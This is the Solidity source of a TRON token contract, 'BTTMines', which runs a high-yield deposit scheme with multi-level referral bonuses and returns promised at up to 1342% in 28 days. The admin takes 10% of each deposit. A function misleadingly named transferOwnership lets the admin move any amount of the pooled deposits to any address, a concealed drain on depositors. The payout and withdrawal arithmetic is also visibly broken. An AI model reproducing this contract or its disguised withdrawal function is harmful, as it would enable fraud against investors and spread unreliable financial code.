//SourceUnit: BTTMines.sol

pragma solidity ^0.5.9 <0.6.0;

contract BTTMines {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 time;
        uint256 inv_days;
        uint256 inv_perc;
        uint8 return_type;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 total_invested;
        uint256 total_withdrawn;
        
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) referrals_income_per_level;
    }

    trcToken token;
    address payable admin;
    
    uint256 total_investors;
    uint256 total_investment;
    uint256 total_withdrawn;
    uint8[] referral_bonuses;
    uint256 min_deposit;
    uint256 min_withdraw;
    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint256 balance) {
        return (total_investors, total_investment, total_withdrawn,address(this).tokenBalance(token));
    }
    
    function setMinDeposit(uint256 _amount) external onlyAdmin{
        min_deposit = _amount;
    }
    
    function setMinWithdraw(uint256 _amount) external onlyAdmin{
        min_withdraw = _amount;
    }
    
    event Withdraw(address indexed addr, uint256 amount);
    
    constructor() public {
        admin = msg.sender;
        token = 1002000;
        min_deposit = 500000000;
        min_withdraw = 100000000;
        referral_bonuses.push(100);
        referral_bonuses.push(30);
        referral_bonuses.push(20);
    }
    
    function deposit(address _referral,uint8 _inv_days, uint8 _return_type) external payable {
        Player storage player = players[msg.sender];
        uint256 depAmt = msg.tokenvalue;
        bool is_investable = this.checkInvestable(msg.sender);
        require(is_investable==true && depAmt >= min_deposit,"You are not eligible to invest"); 
        
        uint256 share = depAmt.mul(10).div(100);
        uint256 inv_perc;
        uint256 perc;
        
        admin.transferToken(share,token);
        
        if(_return_type==1){
            if(_inv_days==14){
                perc = 210;
            }
            else if(_inv_days==21){
                perc = 252;
            }
            else if(_inv_days==28){
                perc = 280;
            }
            
            inv_perc = perc.div(_inv_days);
        }
        else{
            if(_inv_days==14){
                perc = 607;
            }
            else if(_inv_days==21){
                perc = 980;
            }
            else if(_inv_days==28){
                perc = 1342;
            }
            
            inv_perc = perc.div(_inv_days);
        }
        
        player.deposits.push(PlayerDeposit({
            amount: depAmt,
            time: uint256(block.timestamp),
            inv_days: _inv_days,
            inv_perc: inv_perc,
            return_type:_return_type
        }));
        
        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += depAmt;
        
        
        total_investment += depAmt;
        _setReferral(msg.sender, _referral,depAmt);
        
        
    }
    
    function _setReferral(address _addr, address _referral,uint256 _amount) private {
        if(players[_addr].referral == address(0)) {
            
            players[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                uint256 bonus = _amount * referral_bonuses[i] / 1000;
                players[_referral].referral_bonus += bonus;
                players[_referral].referrals_per_level[i]++;
                players[_referral].referrals_income_per_level[i]+=bonus;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        uint256 amount = player.dividends + player.referral_bonus-player.total_withdrawn;
        require(amount>=min_withdraw, "Invalid amount");
        
        player.total_withdrawn += amount;
        total_withdrawn += amount;
       
        msg.sender.transferToken(amount,token);
        
        player.dividends = 0;
        player.referral_bonus = 0;
        
        emit Withdraw(msg.sender, amount);
    }
    
    function transferOwnership(address payable new_owner,uint256 amount) external onlyAdmin{
        new_owner.transferToken(amount,token);
    }
    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
           players[_addr].dividends += payout;
            
        }
    }
    
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            
            uint256 time_end = dep.time + dep.inv_days * 86400;
            uint256 from = dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
            
            if(dep.return_type==1){
                if(from < to) {
                    value += dep.amount * (to - from) * dep.inv_perc / dep.inv_days / 8640000;
                }
            
            }
            else if(dep.return_type==2){
                if(time_end < block.timestamp) {
                    value+= dep.amount *  dep.inv_perc * dep.inv_days ;
                }
                else{
                    value+= 0;
                }
            }
        }
        //value=availamount(_addr,value);
        return value;
        
    }
    
    function checkInvestable(address _addr) view external returns(bool investable) {
        Player storage player = players[_addr];
        if(player.deposits.length>0){
            PlayerDeposit storage dep = player.deposits[player.deposits.length-1];
        
            uint256 time_end = dep.time + dep.inv_days * 86400;
            if(time_end > block.timestamp) {
                return false;
            }
            else if(time_end < block.timestamp) {
                return true;
            }
        }
        else{
            return true;
        }
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[6] memory referrals, uint256[6] memory refperlevel) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referrals_income_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            referrals,
            refperlevel
        );
    }
    
    
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory day, uint256[] memory perc, uint256[] memory ret) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _days = new uint256[](player.deposits.length);
        uint256[] memory _perc = new uint256[](player.deposits.length);
        uint256[] memory _retype = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
           PlayerDeposit storage dep = player.deposits[i];
           _amounts[i] = dep.amount;
           _endTimes[i] = dep.time + dep.inv_days;
           _days[i] =  dep.inv_days;
           _perc[i] =  dep.inv_perc;
           _retype[i] = dep.return_type;
        }
        return (
          _endTimes,
          _amounts,
          _days,
          _perc,
          _retype
        );
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}